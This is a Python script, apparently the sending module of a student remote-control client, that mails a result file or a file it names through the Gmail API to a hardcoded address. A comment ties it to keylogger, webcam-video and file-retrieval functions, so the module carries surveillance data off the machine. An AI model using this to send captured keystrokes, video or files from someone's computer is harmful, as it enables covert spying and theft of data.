import base64
import mimetypes
from email.message import EmailMessage
import os

from google.oauth2.credentials import Credentials
from googleapiclient.discovery import build
from googleapiclient.errors import HttpError
from google_auth_oauthlib.flow import InstalledAppFlow

import os.path

# Send files only for functions "KEYLOOGER", "VIDEO WEBCAM", "RETRIVING FILE"

SCOPES = ['https://mail.google.com/']

# create draft with attachment
def sending_gmail():
  creds = None
  token_path = './email_reader_client/config/token.json'
  cred_path = './email_reader_client/config/credentials.json'
  
  if os.path.exists(token_path):
        creds = Credentials.from_authorized_user_file(token_path, SCOPES)
  else:
        flow = InstalledAppFlow.from_client_secrets_file(cred_path, SCOPES)
        creds = flow.run_local_server(port=0)
        with open(token_path, 'w') as token:
            token.write(creds.to_json()) #read to file .json
  try:
    # create gmail api client
    service = build("gmail", "v1", credentials=creds)
    mime_message = EmailMessage()


    # headers    
    # mail nhận 
    mime_message["To"] = "thaih417@gmail.com"
    
    # mail gửi
    mime_message["From"] = "mangmaytinhchcmus@gmail.com"
    mime_message["Subject"] = "RESPONSE"

    # text
    mime_message.set_content(
        "RESPONSE FROM CLIENT\n"
    )

    # attachment
    # optional file 
    attachment_filename = "./files/result.txt"
    
     # check file existing
    if not os.path.exists(attachment_filename):
        print(f"File '{attachment_filename}' not found.")
        return None
      
    with open(attachment_filename, 'r', encoding='utf-8') as f:
      content = f.read()
      print(f"Content of file: {content}")
      
    if "files/receive" in content:
        print("Found 'files/receive' in content.")
        for line in content.splitlines():
            if "files/receive" in line:
                attachment_filename = line.strip()
                break

    if not os.path.exists(attachment_filename):
        print(f"File '{attachment_filename}' not found.")
        return None
      
    print(f"Sending file: {attachment_filename}")
    
    # guessing the MIME type
    type_subtype, _ = mimetypes.guess_type(attachment_filename)
    maintype, subtype = type_subtype.split("/")

    with open(attachment_filename, "rb") as fp:
      attachment_data = fp.read()
    mime_message.add_attachment(attachment_data, maintype, subtype, filename = os.path.basename(attachment_filename))

    encoded_message = base64.urlsafe_b64encode(mime_message.as_bytes()).decode('utf-8')

    create_draft_request_body = {"raw": encoded_message}
    
    # pylint: disable=E1101
    sent_message = (
        service.users()
        .messages()
        .send(userId="me", body=create_draft_request_body)
        .execute()
    )
    print(f'Message id: {sent_message["id"]}')
  except HttpError as error:
    print(f"An error occurred: {error}")
    sent_message = None
  return sent_message

if __name__ == "__main__":  
    sending_gmail()
  